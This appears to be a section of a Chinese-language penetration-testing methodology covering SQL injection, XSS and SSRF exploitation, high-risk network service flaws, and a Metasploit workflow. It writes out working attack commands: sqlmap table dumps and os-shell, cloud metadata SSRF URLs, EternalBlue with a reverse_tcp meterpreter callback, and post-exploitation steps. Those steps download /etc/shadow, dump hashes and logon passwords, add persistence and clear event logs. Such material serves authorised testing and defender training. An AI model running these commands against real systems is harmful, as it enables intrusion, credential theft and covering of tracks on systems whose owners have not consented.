# 漏洞利用方法论

### 3.1 Web 漏洞利用

#### 3.1.1 SQL 注入利用流程

**检测**
- 手工检测：基于错误、基于布尔、基于时间
- sqlmap 自动化：`sqlmap -u "http://target.com/page?id=1" --batch --dbs`

**利用流程**
```
1. 确定注入点与类型
2. 判断数据库类型
3. 获取数据库信息
   - sqlmap --dbs
   - sqlmap -D dbname --tables
   - sqlmap -D dbname -T tablename --dump
4. 绕过 WAF
   - sqlmap --tamper="tamper脚本"
   - 手工 Payload 变形
5. 写入 WebShell（需 DBA 权限）
   - sqlmap --os-shell
   - INTO OUTFILE
```

#### 3.1.2 XSS 利用流程

**检测**
- 反射型：输入点 → 输出点
- 存储型：输入持久化 → 输出持久化
- DOM 型：JS 执行点

**利用**
```
1. 确定 XSS 类型
2. 测试过滤规则
3. 构造绕过 Payload
4. 选择利用方式
   - Cookie 窃取
   - 键盘记录
   - XSS 平台（XSS Platform）
   - BeEF 框架
5. 处理 CSP 防护
   - JSONP 绕过
   - CDN 白名单利用
   - nonce 泄露
```

#### 3.1.3 SSRF 利用流程

**检测**
- URL 参数中包含外部 URL
- 服务器发起的网络请求

**利用链**
```
1. 探测内网
   - http://127.0.0.1:port
   - http://192.168.1.0/24
   - http://10.0.0.0/8

2. 内网服务利用
   - Redis: http://127.0.0.1:6379
   - MySQL: gopher://127.0.0.1:3306
   - FastCGI: gopher://127.0.0.1:9000

3. 云环境元数据
   - AWS: http://169.254.169.254/latest/meta-data/
   - 阿里云: http://100.100.100.200/latest/meta-data/
   - 腾讯云: http://169.254.128.23/latest/meta-data/

4. 利用协议
   - file:// 读取本地文件
   - gopher:// 发送 TCP 数据
   - dict:// 探测端口
   - ldap:// LDAP 查询
```

### 3.2 网络服务漏洞利用

#### 3.2.1 常见高危服务漏洞

**SMB 服务**
- MS17-010（永恒之蓝）：远程代码执行
- CVE-2020-0796（SMBGhost）：远程代码执行
- SMB 空会话枚举
- Share 枚举与利用

**RDP 服务**
- CVE-2019-0708（BlueKeep）：远程代码执行
- RDP 劫持：tscon 劫持
- 弱密码爆破

**SSH 服务**
- 弱密码爆破：hydra、medusa
- 密钥泄露利用
- SSH 代理转发利用
- CVE-2018-15473 用户枚举

**数据库服务**
- MySQL：弱密码、UDF 提权
- MSSQL：xp_cmdshell、SA 权限利用
- PostgreSQL：COPY FROM PROGRAM
- Redis：未授权访问、写 SSH 公钥、写计划任务、写 WebShell
- MongoDB：未授权访问
- Elasticsearch：未授权访问、脚本执行

### 3.3 Metasploit 使用方法论

#### 3.3.1 基础工作流

```bash
# 启动并创建工作区
msf6 > workspace -a target1

# 导入 nmap 结果
msf6 > db_nmap -sS -sV 10.0.0.0/24

# 搜索模块
msf6 > search type:exploit name:ms17_010

# 使用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 查看选项
msf6 exploit(...) > show options

# 设置参数
msf6 exploit(...) > set RHOSTS 10.0.0.10
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.0.0.5

# 执行
msf6 exploit(...) > exploit
```

#### 3.3.2 Meterpreter 后渗透

```bash
# 系统信息
meterpreter > sysinfo
meterpreter > getuid

# 文件操作
meterpreter > ls
meterpreter > cat /etc/passwd
meterpreter > download /etc/shadow
meterpreter > upload /path/to/tool.exe C:\\Users\\Public

# 进程操作
meterpreter > ps
meterpreter > migrate 1234    # 进程迁移
meterpreter > execute -f cmd.exe -i -H  # 隐藏执行

# 网络操作
meterpreter > ipconfig
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5
meterpreter > route add 10.0.0.0 255.255.255.0 1

# 凭据获取
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# 持久化
meterpreter > persistence -U -i 60 -p 4444 -r 10.0.0.5

# 痕迹清理
meterpreter > clearev
```
